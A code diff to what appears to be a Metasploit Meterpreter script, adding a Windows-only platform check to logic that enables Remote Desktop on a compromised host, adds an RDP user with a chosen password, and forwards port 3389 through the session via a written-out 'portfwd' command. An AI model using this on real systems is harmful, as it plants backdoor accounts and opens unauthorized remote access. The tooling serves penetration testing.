@@ -161,27 +161,31 @@ frwrd = nil
 	end
 
 }
-if args.length > 0
-	if enbl or (usr and pass)
-		message
-		if enbl
-			enablerd()
-			enabletssrv()
+if client.platform =~ /win32|win64/
+	if args.length > 0
+		if enbl or (usr and pass)
+			message
+			if enbl
+				enablerd()
+				enabletssrv()
+			end
+			if usr and pass
+				langdetect(lang)
+				addrdpusr(session, usr, pass, lang)
+			end
+			if frwrd == true
+				print_status("Starting the port forwarding at local port #{lport}")
+				client.run_cmd("portfwd add -L 0.0.0.0 -l #{lport} -p 3389 -r 127.0.0.1")
+			end
+			print_status("For cleanup use command: run multi_console_command -rc #{@dest}")
+		else
+			usage
 		end
-		if usr and pass
-			langdetect(lang)
-			addrdpusr(session, usr, pass, lang)
-		end
-		if frwrd == true
-			print_status("Starting the port forwarding at local port #{lport}")
-			client.run_cmd("portfwd add -L 0.0.0.0 -l #{lport} -p 3389 -r 127.0.0.1")
-		end
-		print_status("For cleanup use command: run multi_console_command -rc #{@dest}")
+
 	else
 		usage
 	end
-
 else
-	usage
+	print_error("This version of Meterpreter is not supported with this Script!")
+	raise Rex::Script::Completed
 end
-
